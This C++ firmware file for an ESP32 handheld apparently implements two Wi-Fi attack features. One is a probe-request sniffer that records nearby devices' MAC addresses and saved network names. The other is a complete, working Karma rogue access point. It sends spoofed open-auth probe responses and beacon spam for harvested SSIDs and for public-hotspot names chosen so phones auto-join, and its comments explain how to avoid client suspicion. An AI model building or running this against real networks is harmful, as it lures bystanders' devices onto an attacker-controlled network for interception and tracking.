/*
 * wifi_probe + wifi_karma
 *
 * Probe Sniff (feat_wifi_probe): listens in promiscuous mode for probe
 * request frames (subtype 0x4). Every probe reveals a client MAC + an
 * SSID the device has saved. Useful recon — tells you which networks
 * a target has connected to in the past. No TX.
 *
 * Karma Attack (feat_wifi_karma): real Karma — replies to every
 * DIRECTED probe request with a unicast probe-response claiming to be
 * that SSID, OPEN auth. Clients that have the SSID saved as OPEN will
 * happily associate. The respond-in-the-callback model is what makes
 * this work: the client is actively listening on the channel for ~30 ms
 * after firing a probe, so a probe-response within that window lands
 * directly instead of needing the client to re-scan.
 *
 * Background beacon spam: every 100 ms the main loop also broadcasts
 * a beacon for each harvested SSID, so lazy clients (those that scan
 * passively rather than probe-actively) still see "their" network and
 * associate. Uses Bruce-style 109 B beacon with RSN-less variant for
 * OPEN auth.
 *
 * Raw TX path matches wifi_deauth_frame.h:
 *   - WIFI_IF_STA + promiscuous (linker override allows mgmt subtypes)
 *   - 2 ms vTaskDelay between successive esp_wifi_80211_tx calls
 *   - lean IDF init w/ shrunk buffers + esp_bt_controller_mem_release
 *
 * Per session-memory, this means BLE is dead after entering Karma
 * until reboot. Acceptable for a Wi-Fi-only attack feature.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_bt.h>
#include <esp_heap_caps.h>

#define PROBE_MAX 32

struct probe_t {
    uint8_t  client[6];     /* last client to probe this SSID */
    char     ssid[33];
    uint32_t last_seen;
    uint32_t hits;          /* total directed probes for this SSID */
    uint32_t responses;     /* probe-response frames we TX'd back */
    int8_t   rssi;
};

static probe_t s_probes[PROBE_MAX];
static volatile int      s_probe_count = 0;
static volatile uint32_t s_probe_total = 0;
static volatile uint32_t s_resp_total  = 0;
static volatile uint32_t s_resp_err    = 0;
static volatile bool     s_karma_mode  = false;
static volatile uint8_t  s_cur_channel = 1;
static portMUX_TYPE      s_probe_mux   = portMUX_INITIALIZER_UNLOCKED;
static uint16_t          s_resp_seq    = 0;

/* Find index for (client, ssid). Returns -1 if not present.
 * NOTE: caller holds s_probe_mux. */
static int find_probe(const uint8_t *client, const char *ssid)
{
    for (int i = 0; i < s_probe_count; ++i) {
        if (memcmp(s_probes[i].client, client, 6) == 0 &&
            strcmp(s_probes[i].ssid, ssid) == 0) return i;
    }
    return -1;
}

/* Build a probe-response frame.
 *   dst    = client MAC (unicast)
 *   src/bs = our spoofed BSSID (we make one up per session)
 *   ssid   = SSID the client asked for
 *   ch     = current channel (goes into DS Parameter Set IE)
 *
 * Returns total frame length. Buffer must be >= 128 bytes.
 *
 * Layout matches beacon_spam's beacon but with subtype 0x5 (probe-resp)
 * and unicast DA. OPEN auth — no RSN IE, Capability has Privacy=0 so
 * clients that saved the SSID as OPEN will accept it. (WPA-saved
 * networks won't bite without a matching RSN IE, but that's expected.) */
static int build_probe_resp(uint8_t *frame,
                            const uint8_t dst[6],
                            const uint8_t bssid[6],
                            const char *ssid,
                            uint8_t ch,
                            uint16_t seq)
{
    /* MAC header (24 B) */
    frame[0] = 0x50;  /* type=mgmt, subtype=probe-resp */
    frame[1] = 0x00;
    frame[2] = 0x00; frame[3] = 0x00;            /* duration */
    memcpy(&frame[4],  dst,   6);                /* DA = probing client */
    memcpy(&frame[10], bssid, 6);                /* SA = our spoofed BSSID */
    memcpy(&frame[16], bssid, 6);                /* BSSID */
    frame[22] = (uint8_t)((seq & 0xF) << 4);     /* fragment=0, seq lo */
    frame[23] = (uint8_t)((seq >> 4) & 0xFF);    /* seq hi */
    /* Fixed body (12 B): timestamp, beacon interval, capabilities. */
    uint64_t ts = (uint64_t)esp_timer_get_time();
    memcpy(&frame[24], &ts, 8);                  /* timestamp */
    frame[32] = 0x64; frame[33] = 0x00;          /* beacon interval 100 TU */
    frame[34] = 0x21; frame[35] = 0x00;          /* cap: ESS|ShortPreamble (no Privacy) */
    /* Tagged params. */
    uint8_t *p = frame + 36;
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    *p++ = 0x00; *p++ = (uint8_t)ssid_len;        /* SSID */
    memcpy(p, ssid, ssid_len); p += ssid_len;
    *p++ = 0x01; *p++ = 0x08;                     /* Supported rates */
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;
    *p++ = 0x03; *p++ = 0x01; *p++ = ch;          /* DS Parameter Set */
    return (int)(p - frame);
}

/* Build an OPEN-auth beacon. Same wire format as probe-resp but
 * subtype 0x8 + broadcast DA. Used for the background beacon spam
 * that pulls in passively-scanning clients. */
static int build_open_beacon(uint8_t *frame,
                             const uint8_t bssid[6],
                             const char *ssid,
                             uint8_t ch,
                             uint16_t seq)
{
    static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    int len = build_probe_resp(frame, BCAST, bssid, ssid, ch, seq);
    frame[0] = 0x80;  /* flip subtype to beacon */
    return len;
}

/* Our spoofed BSSID. Random per-session, but kept stable so the same
 * SSID always answers from the same MAC (clients that already glued
 * a saved SSID to a remembered BSSID will reject mismatched BSSIDs). */
static uint8_t s_spoof_bssid[6];

static void karma_init_bssid(void)
{
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    s_spoof_bssid[0] = 0x02;                          /* locally administered, unicast */
    s_spoof_bssid[1] = (uint8_t)(r1 >> 0);
    s_spoof_bssid[2] = (uint8_t)(r1 >> 8);
    s_spoof_bssid[3] = (uint8_t)(r1 >> 16);
    s_spoof_bssid[4] = (uint8_t)(r2 >> 0);
    s_spoof_bssid[5] = (uint8_t)(r2 >> 8);
}

/* #B4: derive a STABLE per-SSID BSSID so each fake network looks like a
 * distinct real AP instead of one radio claiming a dozen SSIDs (which
 * client OSes flag as suspicious and won't auto-join). FNV-1a hash of
 * the SSID -> locally-administered MAC. Same SSID always maps to the
 * same BSSID across beacon cycles so the "AP" looks stable over time. */
static void karma_ssid_bssid(const char *ssid, uint8_t out[6])
{
    uint32_t h = 2166136261u;
    for (const char *c = ssid; *c; ++c) { h ^= (uint8_t)*c; h *= 16777619u; }
    out[0] = 0x02;                       /* locally administered, unicast */
    out[1] = 0x53;                       /* 'S' marker so our fakes cluster */
    out[2] = (uint8_t)(h >> 0);
    out[3] = (uint8_t)(h >> 8);
    out[4] = (uint8_t)(h >> 16);
    out[5] = (uint8_t)(h >> 24);
}

/* #B4: sticky public-hotspot SSIDs that phones/laptops auto-join
 * without a prompt. Broadcast alongside harvested SSIDs so passive
 * scanners latch on even before they actively probe. Same set the
 * portal preset list uses. */
static const char *KARMA_SEED_SSIDS[] = {
    "xfinitywifi", "attwifi", "Starbucks WiFi", "Google Starbucks",
    "McDonalds Free WiFi", "Free WiFi", "Guest WiFi", "Free Public WiFi",
    "Boingo Hotspot", "spectrum",
};
#define KARMA_SEED_N (sizeof(KARMA_SEED_SSIDS)/sizeof(KARMA_SEED_SSIDS[0]))

/* Promiscuous RX callback. Called from WiFi driver task.
 *
 * For probe-request frames (subtype 0x4):
 *   - extract client MAC + SSID
 *   - update tracker
 *   - if karma mode AND SSID non-empty (directed, not broadcast probe):
 *       build + TX a unicast probe-response back to the client
 *
 * Critical: this runs in the WiFi task context. Keep work small.
 * esp_wifi_80211_tx is safe from this context per IDF docs. */
static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 26) return;

    uint8_t subtype = (p[0] >> 4) & 0xF;
    if (subtype != 0x4) return;  /* probe request only */

    const uint8_t *client = p + 10;
    uint8_t tag_id  = p[24];
    uint8_t tag_len = p[25];
    /* Skip NULL-SSID broadcast probes — nothing to advertise. They're
     * common (every active scan starts with one) and would burn cycles
     * without giving us a target SSID to claim. */
    if (tag_id != 0 || tag_len == 0 || tag_len > 32) return;
    if (pkt->rx_ctrl.sig_len < 26U + tag_len) return;

    char ssid[33] = {0};
    memcpy(ssid, p + 26, tag_len);
    ssid[tag_len] = '\0';

    /* Reject SSIDs with embedded NULs or non-printable garbage —
     * malformed probes from broken drivers and a known crash vector
     * for our printf-based UI. */
    for (uint8_t i = 0; i < tag_len; ++i) {
        if (ssid[i] < 0x20 || ssid[i] == 0x7F) return;
    }

    s_probe_total++;

    portENTER_CRITICAL(&s_probe_mux);
    int idx = find_probe(client, ssid);
    if (idx < 0) {
        if (s_probe_count >= PROBE_MAX) {
            /* Evict oldest. */
            int oldest = 0;
            for (int i = 1; i < s_probe_count; ++i)
                if (s_probes[i].last_seen < s_probes[oldest].last_seen) oldest = i;
            idx = oldest;
            memset(&s_probes[idx], 0, sizeof(s_probes[idx]));
        } else {
            idx = s_probe_count++;
            memset(&s_probes[idx], 0, sizeof(s_probes[idx]));
        }
        memcpy(s_probes[idx].client, client, 6);
        strncpy(s_probes[idx].ssid, ssid, 32);
        s_probes[idx].ssid[32] = '\0';
    } else {
        memcpy(s_probes[idx].client, client, 6);
    }
    s_probes[idx].last_seen = millis();
    s_probes[idx].rssi = pkt->rx_ctrl.rssi;
    s_probes[idx].hits++;
    bool do_respond = s_karma_mode;
    uint16_t seq = s_resp_seq;
    s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
    portEXIT_CRITICAL(&s_probe_mux);

    if (do_respond) {
        /* Fire ONE probe-response per directed probe. Bursting multiple
         * here would queue the dynamic_tx_buf pool and starve later
         * TXes (rc=257) per the wifi_deauth_frame.h investigation. */
        /* #B4: respond with the SAME stable per-SSID BSSID the beacon
         * loop advertises, so the client sees one consistent AP for
         * this SSID (matching beacon + probe-resp = far more likely to
         * auto-associate than a probe-resp from a random new BSSID). */
        uint8_t resp_bssid[6];
        karma_ssid_bssid(ssid, resp_bssid);
        uint8_t frame[128];
        int len = build_probe_resp(frame, client, resp_bssid,
                                   ssid, s_cur_channel, seq);
        int rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
        for (int r2 = 0; rc == ESP_ERR_NO_MEM && r2 < 3; ++r2) { delay(2); rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false); }
        if (rc == ESP_OK) {
            s_resp_total++;
            portENTER_CRITICAL(&s_probe_mux);
            s_probes[idx].responses++;
            portEXIT_CRITICAL(&s_probe_mux);
        } else {
            s_resp_err++;
        }
    }
}

/* Snapshot the SSIDs we've harvested, into a caller-provided buffer.
 * Returns count. SSIDs are deduped — one entry per unique SSID even
 * if multiple clients probed it. */
static int snapshot_unique_ssids(char dst[][33], int cap)
{
    int n = 0;
    portENTER_CRITICAL(&s_probe_mux);
    for (int i = 0; i < s_probe_count && n < cap; ++i) {
        bool dup = false;
        for (int j = 0; j < n; ++j) {
            if (strcmp(dst[j], s_probes[i].ssid) == 0) { dup = true; break; }
        }
        if (!dup) {
            strncpy(dst[n], s_probes[i].ssid, 32);
            dst[n][32] = '\0';
            n++;
        }
    }
    portEXIT_CRITICAL(&s_probe_mux);
    return n;
}

static void draw_probe_list(int cursor)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2);
    if (s_karma_mode) {
        d.printf("KARMA ch%u  pr:%lu  rsp:%lu/%lu",
                 (unsigned)s_cur_channel,
                 (unsigned long)s_probe_total,
                 (unsigned long)s_resp_total,
                 (unsigned long)(s_resp_total + s_resp_err));
    } else {
        d.printf("PROBES ch%u  seen:%lu",
                 (unsigned)s_cur_channel,
                 (unsigned long)s_probe_total);
    }
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

    int count;
    portENTER_CRITICAL(&s_probe_mux);
    count = s_probe_count;
    portEXIT_CRITICAL(&s_probe_mux);

    if (count == 0) {
        d.setTextColor(T_DIM, T_BG);
        d.setCursor(4, BODY_Y + 24);
        d.print("listening for probe requests...");
        return;
    }

    int rows = 8;
    int first = cursor - rows / 2;
    if (first < 0) first = 0;
    if (first + rows > count) first = max(0, count - rows);

    for (int r = 0; r < rows && first + r < count; ++r) {
        probe_t pp;
        portENTER_CRITICAL(&s_probe_mux);
        pp = s_probes[first + r];
        portEXIT_CRITICAL(&s_probe_mux);
        int y = BODY_Y + 16 + r * 11;
        bool sel = (first + r == cursor);
        uint16_t bg = sel ? 0x18C7 : T_BG;
        if (sel) d.fillRect(0, y - 1, SCR_W, 11, bg);

        d.setTextColor(T_DIM, bg);
        d.setCursor(2, y);
        d.printf("%02X%02X", pp.client[4], pp.client[5]);
        /* Show response count in karma mode, RSSI in sniff mode. */
        if (s_karma_mode) {
            uint16_t col = pp.responses > 0 ? T_GOOD : T_DIM;
            d.setTextColor(col, bg);
            d.setCursor(28, y);
            d.printf("%3lur", (unsigned long)pp.responses);
        } else {
            d.setTextColor(T_ACCENT, bg);
            d.setCursor(28, y);
            d.printf("%4d", pp.rssi);
        }
        d.setTextColor(T_DIM, bg);
        d.setCursor(54, y);
        d.printf("%2lu", (unsigned long)pp.hits);
        d.setTextColor(sel ? T_ACCENT : T_FG, bg);
        d.setCursor(72, y);
        d.printf("%.21s", pp.ssid);
    }
}

/* Lean IDF WiFi init — mirrors beacon_spam / Triton. Required for raw
 * mgmt TX on Bruce libs. Returns ESP_OK on success. */
static esp_err_t karma_wifi_init(void)
{
    /* BTDM release removed — was persistent and killed BLE features. */

    esp_netif_init();
    esp_event_loop_create_default();
    static bool s_netif_made = false;
    if (!s_netif_made) {
        esp_netif_create_default_wifi_sta();
        s_netif_made = true;
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.static_tx_buf_num  = 0;
    cfg.dynamic_tx_buf_num = 8;
    cfg.tx_buf_type        = 1;
    cfg.cache_tx_buf_num   = 4;
    cfg.static_rx_buf_num  = 4;
    cfg.dynamic_rx_buf_num = 8;
    cfg.ampdu_tx_enable    = 0;
    cfg.ampdu_rx_enable    = 0;
    cfg.amsdu_tx_enable    = 0;
    esp_err_t err = esp_wifi_init(&cfg);
    Serial.printf("[karma] esp_wifi_init rc=%d\n", (int)err);
    if (err != ESP_OK) return err;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    err = esp_wifi_set_mode(WIFI_MODE_STA);
    Serial.printf("[karma] set_mode rc=%d\n", (int)err);
    err = esp_wifi_start();
    Serial.printf("[karma] wifi_start rc=%d\n", (int)err);
    delay(200);
    esp_wifi_disconnect();           /* park supplicant, free TX pool */
    esp_wifi_set_max_tx_power(84);

    /* Promiscuous mode + ALL filter. Required to enable raw 80211_tx
     * on WIFI_IF_STA per the wifi_deauth_frame.h investigation. */
    static const wifi_promiscuous_filter_t s_all = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
    return ESP_OK;
}

static void run_karma(void)
{
    radio_switch(RADIO_WIFI);
    s_cur_channel = 1;
    karma_init_bssid();
    portENTER_CRITICAL(&s_probe_mux);
    s_probe_count = 0;
    portEXIT_CRITICAL(&s_probe_mux);
    s_probe_total = 0;
    s_resp_total  = 0;
    s_resp_err    = 0;
    s_karma_mode  = true;
    s_resp_seq    = (uint16_t)(esp_random() & 0x0FFF);

    if (karma_wifi_init() != ESP_OK) {
        ui_toast("wifi_init failed", T_BAD, 1500);
        return;
    }
    esp_wifi_set_promiscuous_rx_cb(probe_cb);

    ui_clear_body();
    ui_draw_footer("TAB=chan  ENTER=spam  `=stop");

    int cursor = 0;
    uint32_t last_redraw = 0;
    uint32_t last_beacon = 0;
    bool spam_on = true;
    int last_count  = -1;
    int last_cursor = -1;
    while (true) {
        uint32_t now = millis();
        if (now - last_redraw > 400) {
            last_redraw = now;
            int cnt;
            portENTER_CRITICAL(&s_probe_mux);
            cnt = s_probe_count;
            portEXIT_CRITICAL(&s_probe_mux);
            /* Only clear+repaint the list when it actually changed —
             * the unconditional 400 ms redraw was the flicker source. */
            if (cnt != last_count || cursor != last_cursor) {
                last_count  = cnt;
                last_cursor = cursor;
                draw_probe_list(cursor);
            }
            ui_draw_status(radio_name(), spam_on ? "karma+" : "karma");
        }

        /* Background beacon spam. Pulls in clients that scan passively
         * rather than probing actively. #B4: beacon BOTH the harvested
         * SSIDs AND a sticky public-hotspot seed set, each with a stable
         * per-SSID BSSID so they look like distinct real APs. */
        if (spam_on && now - last_beacon > 100) {
            last_beacon = now;
            char ssids[PROBE_MAX][33];
            int n = snapshot_unique_ssids(ssids, PROBE_MAX);
            uint8_t bssid[6];
            for (int i = 0; i < n; ++i) {
                karma_ssid_bssid(ssids[i], bssid);
                uint8_t frame[128];
                int len = build_open_beacon(frame, bssid, ssids[i],
                                            s_cur_channel, s_resp_seq);
                s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
                int rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                for (int r = 0; rc == ESP_ERR_NO_MEM && r < 4; ++r) { delay(2); rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false); }
                if (rc == ESP_OK) s_resp_total++;
                else              s_resp_err++;
                vTaskDelay(pdMS_TO_TICKS(2));
            }
            /* Sticky seed SSIDs — broadcast every cycle so a fresh
             * client that's never probed still sees a network it
             * auto-joins. */
            for (size_t i = 0; i < KARMA_SEED_N; ++i) {
                karma_ssid_bssid(KARMA_SEED_SSIDS[i], bssid);
                uint8_t frame[128];
                int len = build_open_beacon(frame, bssid, KARMA_SEED_SSIDS[i],
                                            s_cur_channel, s_resp_seq);
                s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
                int rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                for (int r = 0; rc == ESP_ERR_NO_MEM && r < 4; ++r) { delay(2); rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false); }
                if (rc == ESP_OK) s_resp_total++;
                else              s_resp_err++;
                vTaskDelay(pdMS_TO_TICKS(2));
            }
        }

        /* Active listening indicator every iteration so a quiet channel
         * (no probes yet) never reads as a frozen device. Self-throttles. */
        int lcnt;
        portENTER_CRITICAL(&s_probe_mux);
        lcnt = s_probe_count;
        portEXIT_CRITICAL(&s_probe_mux);
        ui_scanning_indicator("listening", lcnt);

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(10); continue; }
        if (k == PK_ESC) break;

        int count;
        portENTER_CRITICAL(&s_probe_mux);
        count = s_probe_count;
        portEXIT_CRITICAL(&s_probe_mux);
        switch (k) {
        case ';': case PK_UP:   if (cursor > 0) cursor--; break;
        case '.': case PK_DOWN: if (cursor + 1 < count) cursor++; break;
        case PK_TAB:
            /* Manual channel hop. Karma is channel-bound — clients
             * probing on ch 6 won't see our response if we're sniffing
             * on ch 1. Operator picks the channel based on target. */
            s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
            esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
            break;
        case PK_ENTER:
            spam_on = !spam_on;
            /* Bug 1 / repro 2026-06-06: previously ENTER toggled spam_on
             * silently and the user had no way to tell anything fired.
             * Toast surfaces the new state explicitly. */
            ui_toast(spam_on ? "karma beacon spam ON"
                             : "karma beacon spam OFF",
                     spam_on ? T_GOOD : T_DIM, 700);
            break;
        }
    }

    s_karma_mode = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_stop();
    esp_wifi_deinit();
}

static void run_probe_sniff(void)
{
    radio_switch(RADIO_WIFI);
    wifi_lean_sta_init();
    s_cur_channel = 1;
    portENTER_CRITICAL(&s_probe_mux);
    s_probe_count = 0;
    portEXIT_CRITICAL(&s_probe_mux);
    s_probe_total = 0;
    s_karma_mode  = false;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_cb);
    esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);

    ui_draw_footer("TAB=chan  `=stop");

    int cursor = 0;
    uint32_t last_redraw = 0;
    int last_count  = -1;
    int last_cursor = -1;
    while (true) {
        uint32_t now = millis();
        if (now - last_redraw > 400) {
            last_redraw = now;
            int cnt;
            portENTER_CRITICAL(&s_probe_mux);
            cnt = s_probe_count;
            portEXIT_CRITICAL(&s_probe_mux);
            /* Repaint only on change — no unconditional periodic clear. */
            if (cnt != last_count || cursor != last_cursor) {
                last_count  = cnt;
                last_cursor = cursor;
                draw_probe_list(cursor);
            }
        }
        /* Active listening indicator every iteration so a quiet channel
         * (no probes yet) never reads as a frozen device. Self-throttles. */
        int lcnt;
        portENTER_CRITICAL(&s_probe_mux);
        lcnt = s_probe_count;
        portEXIT_CRITICAL(&s_probe_mux);
        ui_scanning_indicator("listening", lcnt);

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        int count;
        portENTER_CRITICAL(&s_probe_mux);
        count = s_probe_count;
        portEXIT_CRITICAL(&s_probe_mux);
        switch (k) {
        case ';': case PK_UP:   if (cursor > 0) cursor--; break;
        case '.': case PK_DOWN: if (cursor + 1 < count) cursor++; break;
        case PK_TAB:
            s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
            esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
            break;
        }
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void feat_wifi_probe(void) { run_probe_sniff(); }
void feat_wifi_karma(void) { run_karma();       }
